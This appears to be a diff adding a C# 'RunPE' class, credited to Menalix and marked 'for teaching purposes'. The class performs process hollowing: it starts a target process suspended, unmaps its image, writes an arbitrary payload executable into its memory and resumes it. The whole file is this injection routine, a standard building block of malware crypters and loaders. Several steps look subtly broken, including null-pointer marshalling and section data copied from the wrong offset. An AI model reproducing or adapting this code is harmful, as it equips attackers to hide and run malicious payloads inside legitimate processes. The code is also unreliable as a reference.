@@ -1,0 +1,362 @@
+using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
+using System.Reflection;
+using System.Runtime;
+using Microsoft.VisualBasic;
+using System.Collections;
+using System.Collections.Generic;
+using System.Data;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace skip
+{
+ static class MenaPE
+{
+    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
+
+    //------------------------------
+    //Title: MenaPE (RunPE Class)
+    //Author: Menalix
+    //Website: Menalix.com
+    //Notice: For teaching purposes
+    //------------------------------
+
+    #region "Static API Calls"
+
+    public static extern IntPtr LoadLibraryA(string Name);
+    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hProcess, string Name);
+    #endregion
+
+    #region "Dynamic API Caller"
+
+    private static T CreateApi<T>(string Name, string Method)
+    {
+        return (T)(object)System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(Name), Method), typeof(T));
+    }
+
+    #endregion
+
+    #region "Dynamic API's"
+
+    private delegate bool ReadProcessMemoryParameters(IntPtr hProcess, IntPtr lpBaseAddress, ref uint lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
+    static readonly ReadProcessMemoryParameters ReadProcessMemory = CreateApi<ReadProcessMemoryParameters>("kernel32", "ReadProcessMemory");
+
+    private delegate bool CreateProcessParameters(string ApplicationName, string CommandLine, IntPtr ProcessAttributes, IntPtr ThreadAttributes, bool InheritHandles, uint CreationFlags, IntPtr Environment, string CurrentDirectory, ref STARTUPINFO StartupInfo, ref PROCESS_INFORMATION ProcessInformation);
+    static CreateProcessParameters CreateProcess = CreateApi<CreateProcessParameters>("kernel32", "CreateProcessA");
+
+    private delegate uint NtQueryInformationProcessParameters(IntPtr hProcess, int ProcessInformationClass, ref PROCESS_BASIC_INFORMATION ProcessInformation, uint ProcessInformationLength, ref uint ReturnLength);
+    static readonly NtQueryInformationProcessParameters NtQueryInformationProcess = CreateApi<NtQueryInformationProcessParameters>("ntdll", "NtQueryInformationProcess");
+
+    private delegate bool GetThreadContext64Parameters(IntPtr hThread, ref CONTEXT32 lpContext);
+    static GetThreadContext64Parameters GetThreadContext64 = null;
+
+    private delegate bool IsWow64ProcessParameters(IntPtr hProcess, ref bool Wow64Process);
+    static readonly IsWow64ProcessParameters IsWow64Process = CreateApi<IsWow64ProcessParameters>("kernel32", "IsWow64Process");
+
+    private delegate bool WriteProcessMemoryParameters(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
+    static readonly WriteProcessMemoryParameters WriteProcessMemory = CreateApi<WriteProcessMemoryParameters>("kernel32", "WriteProcessMemory");
+
+    private delegate uint NtUnmapViewOfSectionParameters(IntPtr hProcess, IntPtr pBaseAddress);
+    static readonly NtUnmapViewOfSectionParameters NtUnmapViewOfSection = CreateApi<NtUnmapViewOfSectionParameters>("ntdll", "NtUnmapViewOfSection");
+
+    private delegate IntPtr VirtualAllocExParameters(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    static readonly VirtualAllocExParameters VirtualAllocEx = CreateApi<VirtualAllocExParameters>("kernel32", "VirtualAllocEx");
+
+    private delegate uint ResumeThreadParameters(IntPtr hThread);
+    static readonly ResumeThreadParameters ResumeThread = CreateApi<ResumeThreadParameters>("kernel32", "ResumeThread");
+
+    #endregion
+
+    #region "API Structures"
+    private struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+    private struct STARTUPINFO
+    {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst = 36)]
+        public byte[] Misc;
+        public byte lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+    public struct FLOATING_SAVE_AREA
+    {
+        public uint Control;
+        public uint Status;
+        public uint Tag;
+        public uint ErrorO;
+        public uint ErrorS;
+        public uint DataO;
+        public uint DataS;
+        [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst = 80)]
+        public byte[] RegisterArea;
+        public uint State;
+    }
+    public struct CONTEXT32
+    {
+        public long ContextFlags;
+        public uint Dr0;
+        public uint Dr1;
+        public uint Dr2;
+        public uint Dr3;
+        public uint Dr6;
+        public uint Dr7;
+        public FLOATING_SAVE_AREA FloatSave;
+        public uint SegGs;
+        public uint SegFs;
+        public uint SegEs;
+        public uint SegDs;
+        public uint Edi;
+        public uint Esi;
+        public uint Ebx;
+        public uint Edx;
+        public uint Ecx;
+        public uint Eax;
+        public uint Ebp;
+        public uint Eip;
+        public uint SegCs;
+        public uint EFlags;
+        public uint Esp;
+        public uint SegSs;
+        [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst = 512)]
+        public byte[] ExtendedRegisters;
+    }
+    public struct PROCESS_BASIC_INFORMATION
+    {
+        public IntPtr ExitStatus;
+        public IntPtr PebBaseAddress;
+        public IntPtr AffinityMask;
+        public IntPtr BasePriority;
+        public IntPtr UniqueProcessID;
+        public IntPtr InheritedFromUniqueProcessId;
+    }
+    #endregion
+
+    #region "Injection"
+
+    public static bool Run(string path, byte[] payload, uint creationflag)
+    {
+        for (int I = 1; I <= 5; I++)
+        {
+            if (HandleRun(path, payload, creationflag))
+                return true;
+        }
+        return false;
+    }
+
+    private static bool HandleRun(string Path, byte[] payload, uint creationflag)
+    {
+        IntPtr nullPtr = IntPtr.Zero;
+
+        uint ReadWrite = 0;
+        string QuotedPath = string.Format("\"{0}\"", Path);
+
+        STARTUPINFO SI = new STARTUPINFO();
+        PROCESS_INFORMATION PI = new PROCESS_INFORMATION();
+
+        SI.cb = Convert.ToUInt32(System.Runtime.InteropServices.Marshal.SizeOf(typeof(STARTUPINFO)));
+        //Parses the size of the structure to the structure, so it retrieves the right size of data
+
+        try
+        {
+            //COMMENT: Creating a target process in suspended state, which makes it patch ready and we also retrieves its process information and startup information.
+            if (!CreateProcess(Path, QuotedPath, IntPtr.Zero, IntPtr.Zero, true, creationflag, IntPtr.Zero, Directory.GetCurrentDirectory(), ref SI, ref PI))
+                throw new Exception();
+
+            //COMMENT: Defines some variables we need in the next process
+            PROCESS_BASIC_INFORMATION ProccessInfo = new PROCESS_BASIC_INFORMATION();
+            uint RetLength = 0;
+            dynamic Context = null;
+            int? PEBAddress32 = null;
+            Int64? PEBAddress64 = null;
+            bool TargetIs64 = false;
+            bool IsWow64Proc = false;
+
+            IsWow64Process(PI.hProcess, ref IsWow64Proc);
+            //COMMENT: Retrieves Boolean to know if target process is a 32bit process running in 32bit system, or a 32bit process running under WOW64 in a 64bit system.
+            //COMMENT: Checks the Boolean retrieved from before OR checks if our calling process is 32bit
+            if (IsWow64Proc | IntPtr.Size == 4)
+            {
+                Context = new CONTEXT32();
+                Context.ContextFlags = 0x1000002L;
+                //COMMENT: Parses the context flag CONTEXT_AMD64(&H00100000L) + CONTEXT_INTEGER(0x00000002L) to tell that we want a structure of a 32bit process running under WOW64, you can see all context flags in winnt.h header file.
+                //COMMENT: Checks if our own process is 64bit and the target process is 32bit in wow64
+                if (IsWow64Proc && IntPtr.Size == 8)
+                {
+                    GetThreadContext64 = CreateApi<GetThreadContext64Parameters>("kernel32", "Wow64GetThreadContext");
+                    //COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
+                    if (!GetThreadContext64(PI.hThread, Context))
+                        throw new Exception();
+                    Console.WriteLine(Context.Ebx);
+                    PEBAddress32 = Context.Ebx;
+                    TargetIs64 = false;
+                    //COMMENT: If our process is 32bit and the target process is 32bit we get here. 
+                }
+                else
+                {
+                    NtQueryInformationProcess(PI.hProcess, 0, ref ProccessInfo, (uint)System.Runtime.InteropServices.Marshal.SizeOf(ProccessInfo), ref RetLength);
+                    //COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
+                    Marshal.PtrToStructure( ProccessInfo.PebBaseAddress,  PEBAddress32 );
+                    TargetIs64 = false;
+                }
+                //COMMENT: If our process is 64bit and the target process is 64bit we get here. 
+            }
+            else
+            {
+                NtQueryInformationProcess(PI.hProcess, 0, ref ProccessInfo, (uint)System.Runtime.InteropServices.Marshal.SizeOf(ProccessInfo), ref RetLength);
+                //COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
+                Marshal.PtrToStructure(ProccessInfo.PebBaseAddress, PEBAddress64);
+                TargetIs64 = true;
+            }
+
+
+            uint  BaseAddress = 0;
+            IntPtr PEBAddress64ptr = nullPtr;
+            IntPtr PEBAddress32ptr = nullPtr;
+
+            if (TargetIs64 == true)
+            {
+
+                Marshal.StructureToPtr(PEBAddress64 + 0x10, PEBAddress64ptr, true);
+                ReadProcessMemory(PI.hProcess, PEBAddress64ptr, ref BaseAddress, 4, ref ReadWrite);
+                //COMMENT: Reads the BaseAddress of a 64bit Process, which is where the exe data starts
+            }
+            else
+            {
+                Marshal.StructureToPtr(PEBAddress32 + 0x08, PEBAddress32ptr, true);
+                ReadProcessMemory(PI.hProcess, PEBAddress32ptr , ref BaseAddress, 4, ref ReadWrite);
+                //COMMENT: Reads the BaseAddress of a 32bit Process, which is where the exe data starts
+            }
+
+            bool PayloadIs64 = false;
+            int dwPEHeaderAddress = BitConverter.ToInt32(payload, 0x3c);
+            //COMMENT: Gets the PEHeader start address
+            int dwNetDirFlags = BitConverter.ToInt32(payload, dwPEHeaderAddress + 0x398);
+            //COMMENT: Gets the .NET Header Flags value to determine if its a AnyCPU Compiled exe or not
+            int wMachine = BitConverter.ToInt16(payload, dwPEHeaderAddress + 0x4);
+            //COMMENT: Gets the reads the Machine value
+
+            if (wMachine == 8664)
+            {
+                PayloadIs64 = true;
+                //Checks the Machine value to know if payload is 64bit or not"
+            }
+            else
+            {
+                PayloadIs64 = false;
+            }
+
+            if (PayloadIs64 == false)
+            {
+                //To make sure we don't rewrite flags on a Payload which is already AnyCPU Compiled, it will only slow us down
+                if (dwNetDirFlags == 0x3)
+                {
+                    Buffer.SetByte(payload, dwPEHeaderAddress + 0x398, 0x1);
+                    //Replaces the .NET Header Flag on a 32bit compiled payload, to make it possible doing 32bit -> 64bit injection
+                }
+            }
+
+            int dwImageBase = 0;
+            if (PayloadIs64 == true)
+            {
+                dwImageBase = BitConverter.ToInt32(payload, dwPEHeaderAddress + 0x30);
+                //Reads the ImageBase value of a 64bit payload, it's kind of unnessecary as ImageBase should always be: &H400000, this is the virtual addressstart location for our exe in its own memory space
+            }
+            else
+            {
+                dwImageBase = BitConverter.ToInt32(payload, dwPEHeaderAddress + 0x34);
+                //Reads the ImageBase value of a 32bit payload, it's kind of unnessecary as ImageBase should always be: &H400000, this is the virtual address start location for our exe in its own memory space
+            }
+
+            //COMMENT: If the BaseAddress of our Exe is matching the ImageBase, it's because it's mapped and we have to unmap it
+            if (dwImageBase == BaseAddress)
+            {
+                IntPtr BaseAddressptr = new IntPtr();
+                Marshal.StructureToPtr(BaseAddress, BaseAddressptr, true); 
+                if (!(NtUnmapViewOfSection(PI.hProcess, BaseAddressptr) == 0))
+                    throw new Exception();
+                //COMMENT: Unmapping it
+            }
+
+            int dwSizeOfImage = BitConverter.ToInt32(payload, dwPEHeaderAddress + 0x50);
+            IntPtr dwImageBaseptr = new IntPtr();
+            Marshal.StructureToPtr(dwImageBase, dwImageBaseptr, true);
+            IntPtr dwNewImageBase = VirtualAllocEx(PI.hProcess, dwImageBaseptr, (uint)dwSizeOfImage, 0x3000, 0x40);
+            //COMMENT: Makes the process ready to write in by specifying how much space we need to do it and where we need it
+
+            if (dwNewImageBase == nullPtr)
+                throw new Exception();
+
+            int dwSizeOfHeaders = BitConverter.ToInt32(payload, dwPEHeaderAddress + 0x54);
+
+            IntPtr payloadptr = Marshal.AllocHGlobal(payload.Length);
+            Marshal.Copy(payload, 0, payloadptr, payload.Length);
+            if (!WriteProcessMemory(PI.hProcess, dwNewImageBase, payloadptr, (uint)(dwSizeOfHeaders & 0x7FFF), ref ReadWrite))
+                throw new Exception();
+            //Writes the size of the payloads PE header to the target
+
+            //COMMENT: This is here where most of the magic happens. We write in all our sections data, which contains our resssources, code and the information to utilize the sections: VirtualAddress, SizeOfRawData and PointerToRawData
+            short SizeOfOptionalHeader = BitConverter.ToInt16(payload, dwPEHeaderAddress + 0x14);
+            int SectionOffset = dwPEHeaderAddress + (0x16 + SizeOfOptionalHeader + 0x2);
+            short NumberOfSections = BitConverter.ToInt16(payload, dwPEHeaderAddress + 0x6);
+            for (int I = 0; I <= NumberOfSections - 1; I++)
+            {
+                int VirtualAddress = BitConverter.ToInt32(payload, SectionOffset + 0xc);
+                uint SizeOfRawData = BitConverter.ToUInt32(payload, SectionOffset + 0x10);
+                int PointerToRawData = BitConverter.ToInt32(payload, SectionOffset + 0x14);
+                if (!(SizeOfRawData == 0))
+                {
+                    IntPtr SectionDataptr = Marshal.AllocHGlobal((int)SizeOfRawData);
+                    Marshal.Copy(payload, 0, SectionDataptr, (int)SizeOfRawData);
+                    if (!WriteProcessMemory(PI.hProcess, dwNewImageBase + VirtualAddress, SectionDataptr, SizeOfRawData, ref ReadWrite))
+                        throw new Exception();
+                }
+                SectionOffset += 0x28;
+            }
+
+            //byte[] PointerData = BitConverter.GetBytes(dwNewImageBase);
+            if (TargetIs64 == true)
+            {
+                if (!WriteProcessMemory(PI.hProcess, PEBAddress64ptr, dwNewImageBase, 4, ref ReadWrite))
+                    throw new Exception();
+                //Writes the new etrypoint for 64bit target
+            }
+            else
+            {
+                if (!WriteProcessMemory(PI.hProcess, PEBAddress32ptr + 0x8, dwNewImageBase, 4, ref ReadWrite))
+                    throw new Exception();
+                //Writes the new entrypoint for 32bit target
+            }
+            if (ResumeThread(PI.hThread) == 0xFFFFFFFF)
+                throw new Exception();
+            //Resumes the suspended target with all its new exciting data
+
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine(ex);
+            Process P = Process.GetProcessById(Convert.ToInt32(PI.dwProcessId));
+            if (P != null)
+                P.Kill();
+            return false;
+        }
+
+        return true;
+    }
+    #endregion
+
+}
+}
